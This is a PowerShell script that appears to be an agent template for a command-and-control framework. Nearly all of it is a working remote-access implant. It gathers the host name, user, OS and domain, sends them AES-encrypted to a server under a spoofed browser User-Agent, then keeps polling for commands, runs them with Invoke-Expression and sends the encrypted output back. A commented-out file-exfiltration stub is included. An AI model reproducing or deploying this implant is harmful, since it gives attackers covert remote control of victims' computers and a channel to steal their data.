$interval = OCU_INTERVAL;
$key = "OCT_KEY";
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function EncryptCommand($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    # $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function DecryptCommand($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    # $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

# prepare the variables
$progressPreference = 'silentlyContinue';
$wc = New-Object system.Net.WebClient;
$wc2 = New-Object system.Net.WebClient;
$hostname = hostname;
$random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$final_hostname = "$hostname-$random";
$whoami = whoami;
$os = (Get-WmiObject -class Win32_OperatingSystem).Caption;
$domain = (Get-WmiObject Win32_ComputerSystem).Domain;

# format the headers
$raw_header = "$final_hostname,$whoami,$os,$pid,$domain";

# encrypt the variables
$encrypted_header = EncryptCommand $key $raw_header;

# send the encrypted variables to the server
$wc.Headers.add("Authorization",$encrypted_header);
$wc.Headers.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")
$wc.downloadString("OCU_PROTO://SRVHOST/first_ping");

while($true){
    $command_raw = $wc2.downloadString("OCU_PROTO://SRVHOST/command/$final_hostname");
    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command_raw));
    if($command.split(" ")[0] -like "download"){
    # we need to write a download operation here !
    #Invoke-RestMethod -Uri OCU_PROTO://SRVHOST/file_receiver -Method Post -InFile $file_path -Headers @{"filename"="$file_name"};
    #$file_path = $command.split(" ")[1];
    #$file_content = Get-Content $file_path;
    #$file_name = $file_path.split("\\")[-1];
    #echo $file_content;
    #$sEncodedString=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($file_content));
    #$postdata = @{data=$file_content};
    #Invoke-WebRequest -Uri OCU_PROTO://SRVHOST/file_receiver -Method POST -Body $postdata -Headers @{"filename"="$file_name"}
    }

    elseif ($command -like "False"){

    }

    elseif ($command -like "Delete"){

    exit

    }

    else{

    try{
    $decrypted_command = (DecryptCommand $key $command);
    $uencoding = [system.Text.Encoding]::UTF8
    $bytes_array = $uencoding.GetBytes($decrypted_command.Trim([char]0x0008).Trim([char]0x0003).Trim([char]0x0000).Trim([char]0x0002).Trim([char]0x0005).Trim([char]0x0006).Trim([char]0x0007))
    $en = [system.Text.Encoding]::ASCII
    $final_command = $en.GetString($bytes_array)
    $ec = Invoke-Expression ($final_command) | Out-String;
    }
    catch{
    $ec = $Error[0] | Out-String;
    }

    $EncodedText = EncryptCommand $key $ec;
    $wc3 = New-Object system.Net.WebClient;
    $wc3.Headers.add("Authorization",$EncodedText);
    $wc3.downloadString("OCU_PROTO://SRVHOST/command_receiver");



    }
    sleep $interval;

    }
